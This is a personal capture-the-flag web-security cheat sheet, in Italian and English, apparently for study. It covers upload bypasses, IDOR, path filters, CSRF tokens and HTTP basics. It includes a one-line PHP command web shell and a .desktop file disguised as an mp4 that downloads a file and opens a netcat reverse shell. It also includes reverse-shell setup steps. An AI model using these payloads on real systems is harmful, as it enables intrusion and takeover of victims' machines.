## WEB
- `curl sito | grep flag` provarlo sempre, potrebbe funzionare...
- Se non trovi la risposta e hai delle richieste HTTP prova a **cambiare** il *metodo*
- Se il **check** è via **js** scarica tutta la pagina e la modifichi in locale come vuoi ( *se non riesci a modificarla live sul broser* )
- **Se non trovi la risposta fai generare errori a php**, tipicamente inviando array vuoti: `input=[]` o trasformando in array vuoti: `input[]=`
- Controlla se il confronto è fatto con `==` o `===` in tal caso prova a traformare in un altro tipo ad esempio un array...
- **`.DS_Store`**: is a common file in some websites, I think only in Apache servers, it is connected with MAC and Storage
- python [`requests`](https://requests.readthedocs.io/en/latest/user/quickstart/) module
  - `page = requests.get('url', params={'getParam': 'val'})`
  - `page = requests.get(url, headers={'user-agent': 'my-app/0.0.1'})`
  - `page = requests.post('http://web-08.challs.olicyber.it/login', data={"username": "admin","password": "admin"})`
  - ```python
    data = {
    "username": "panino12345678",
    "password": "panino12345678",
    "invite": code
    }

    page = requests.post(url, json=data)
    ```
- [`beautifulSoup`](https://www.crummy.com/software/BeautifulSoup/bs4/doc/)

  **Gli attributi degli elementi si accedono tramite array associativi: `soup.img['src']`**

  ```python
  import requests as req
  from bs4 import BeautifulSoup
   
  page = req.get('http://captcha.challs.olicyber.it/')
   
  soup = BeautifulSoup(page.text, 'html.parser')
  ```
- **Change directory**: if there is a filter for `../` try `.../` or something similar
- **Insecure direct object reference (IDOR) vulnerability** arises when attackers can access or modify objects by manipulating identifiers used in a web application's URLs or parameters. It occurs due to missing access control checks, which fail to verify whether a user should be allowed to access specific data. (`http://notes.challs.olicyber.it/account/account_number_that_you_want`)

- **`.htaccess`**: is a common file in a lots of websites, I think only in Apache servers
- **File upload possibile**:

  Try to upload the file (with the extensions) that you want:
  - `yoyo.png.php`
  - **Magic Bytes**: search the [specific magic bytes](https://en.wikipedia.org/wiki/List_of_file_signatures) for the file requests, convert and **save** them in a file with [CyberChef](https://cyberchef.org/) (*from hex*). *Remember to save them in a file creating and saving a new file with cyberchef option*
  - **[Null Byte Injection](https://youtu.be/jBtzFGwHvxE)**: a technique for sending data that would be filtered otherwise. It relies on injecting the null byte characters (`%00`, `\x00`) in the supplied data. Its role is to terminate a string*

  Una volta caricato il file che vuoi puoi provare una [*reverse-shell*](#reverse-shell) or a simple *single command executer* (a small php cmd payload): ```<?=`$_GET[0]`?>```, in order to use it: `www.pippo.it/yo.php?0=command` for example: *http://atlas.picoctf.net:57784/uploads/yoyo.png.php?0=cat ../MFRDAZLDMUYDG.txt*. You can use spaces, dot...
  
  ###### Example 1
  1. An attacker wants to retrieve the file `/etc/passwd` but an extension `.php` is appended automatically such as `/etc/passwd.php`.
  2. The attacker uses the null byte to terminate the string and throw away the `.php` extension: `/etc/passwd%00`
   
  ###### Example 2
   1. An attacker wants to upload a `malicious.php`, but the only extension allowed is `.pdf`.
   2. The attacker constructs the file name such as `malicious.php%00.pdf` and uploads the file.
   3. The application reads the `.pdf` extension, validate the upload, and later throws the end of the string due to the null byte.
   4. The file `malicious.php` is then put in the server.

  ###### [Example 3](https://brandon-t-elliott.github.io/trickster)

- **Redirect Links**
Add `+` at the end of the URL to see the site where the redirect links will bring you: `https://tinyurl.com/bw7t8p4u+`

- **`robots.txt`**
Sometimes the websites contain a robots.txt file, it can be usefull for example for the SEO, in particular we could don't want to indexing our web sites.

- Sessioni
Il cookie sessione è in base 64, decodificarlo e vedere come è scritto, non sempre è possibile copiarlo ed essere loggati, però in alcuni casi si. Per defifrarlo basta usare [CyberChef](https://cyberchef.org/)

- Prova sempre a loggarti come **admin**

- Cambiare `IP` di provenienza: è un *header*, tipicamente `X-Forwarded-For` o `Forwarded`

### Comandi e strumenti
- Gobuster
- [nikto](#nikto)
- [rustscan](#rustscan)
- [smbclient](#smbclient)

Modificare ed effettuare richieste particolari:
- postman
- Requests *python library* (file `web.py`)
- burp suite

### HTTP 
#### CODE
- 100 - 199 (Information)
- 200 - 299 (Successful)
- 300 - 399 (Redirection)
- 400 - 499 (Client error)
- 500 - 599 (Server error)

#### verbose
- GET: richiede al server una risorsa, possono essere specificati alcuni parametri attraverso la coppia: chiave=valore&chiave1=valore1
- HEAD: richiede solo l'header, tipicamente utilizzato in fase di testing
- POST: invia informazioni all'indirizzo indicato, esse sono inserite nel body della richiesta
- PUT: esegue l'upload di un file su server
- DELETE: cancella una risorsa
- OPTIONS: richiede al server l'elenco dei metodi concessi
- TRACE: traccia una richiesta

### Reverse Shell
Aprire una reverse shell significa poter eseguire comandi sulla macchina vittima e avere quindi un possibile controllo equivalente al 100%, il tutto dipende dai privilegi che si riesce ad ottenere attraverso le tattiche di [[Post-exploitation]] o in base alla o alle vulnerabilità sfruttate, individuate grazie ai metoditi di [[Reconnaissance]], sia [[Active Reconnaissance]] che [[Passive Reconnaissance]].

#### Reverse shell with an mp4 file (only in linux mint?)
> whatch [this](https://youtu.be/ZlfloTpLGT0?list=PL0fOAKA0mBdspB0x8BhMegc0ZoEwQpq32) video or read [this](https://null-byte.wonderhowto.com/how-to/pop-reverse-shell-with-video-file-by-exploiting-popular-linux-file-managers-0196078/) article

1. Create a file named `name.desktop`
2. write in there these lines:
   ```
        [Desktop Entry]
        Encoding=UTF-8
        Name=fake_video.mp4
        Exec=/usr/bin/wget 'http://192.168.1.XX/real_video.mp4' -O /tmp/real_video.mp4; /usr/bin/xdg-open /tmp/real_video.mp4; /usr/bin/mkfifo /tmp/f; /bin/nc 192.168.1.XX 1234 < /tmp/f | /bin/bash -i > /tmp/f 2>&1 &
        Terminal=false
        Type=Application
        Icon=video-x-generic
   ```
3. change the first ip addr with **your local server** ip addr
4. change the second ip addr with **your local server** ip addr

### Reverse shell php
1. Download the file [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

2. Edit the php-reverse-shell.php file and edit the ip to be your tun0 ip (you can get this by going to [ilmioip](https://www.mio-ip.it/) in the browser of your device). 

3. We're now going to listen to incoming connections using netcat. Run the following command: `nc -lvnp 1234`

4. Search the page to load and execute your payload

> As you can see you will open a local server on your computer on port 1234, from here, using ncat you will interact with the target host shell

> Per mettere online il server locale ci si può appoggiare ad ngrok

### token CSRF
Il token CSRF è un sistema impiegato per impedire l'esecuzione di attacchi di tipo Cross-Site Request Forgery. L'attacco consisterebbe nell'ingannare un utente di un servizio web a cliccare su un link o sul tasto di invio di un form inclusi in un'email o su un sito controllato dall'attaccante, che abbiano come target una risorsa "pericolosa" del servizio bersaglio (p.e. una risorsa la cui richiesta rappresenti un comando di cancellazione dell'account). Il meccanismo del cookie di sessione, ottenibile solo con username e password sconosciuti all'attaccante, impedice a quest'ultimo di eseguire personalmente l'operazione "pericolosa" spacciandosi per l'utente, ma se l'utente viene indotto con l'inganno a cliccare il link malevolo su una macchina su cui abbia precedentemente eseguito l'accesso al servizio bersaglio, il cookie contenente il token di sessione verrà allegato automaticamente alla richiesta effettuata, validandola, senza che l'attaccante abbia bisogno di rubarlo o di riprodurne uno contraffatto.

Il token CSRF impedisce questo tipo di attacco perché non viene inviato automaticamente dal browser come avviene per i normali cookie. Esso viene comunque memorizzato sulla macchina client in uno storage accessibile solo alle risorse associate al relativo servizio (e quindi fuori dal controllo dell'attaccante), ma deve essere esplicitamente allegato alle richieste HTTP sotto forma, ad esempio, di parametro GET, o all'interno al corpo di una richiesta POST, quando queste vengono eseguire. In questo modo è impossibile portare l'utente a generare una richiesta pericolosa con un semplice click, perché per generare un link pericoloso l'attaccante sarebbe costretto a conoscere il token. Per complicare ulteriormente le cose, i token CSRF sono tipicamente usa e getta, e ad ogni operazione completata con successo il client ne riceve uno nuovo generato casualmente. Il nuovo token viene solitamente aggiunto al corpo della risorsa restituita.

### URN URI URL
L'Uniform Resource Identifier, URI, è una stringa che identifica univocamente una risorsa; l'Uniform Resource Locator è una specifica dell'URI che comprende, oltre al percorso che identifica la risorsa, viene aggiunto il protocollo usato per accendervi, comunemente il termine URL viene usato impropriamente per riferirsi ad ogni tipo di URI.

In addizione a URI e URL esiste anche l'Uniform Resource Name, URN, il quale è anch'esso un sottoinsieme dell'URI, ma a differenza dell'URL indica solo il percorso della risorsa.

Le risorse vengono identificate con un URI, se esso indica anche il protocollo con cui accedere alla risorsa è un URL, altrimenti è un URN.

- **URL** `https://www.tiadeca.com/blog-page.php`
- **URN** `tiadeca.com/blog-page.php`
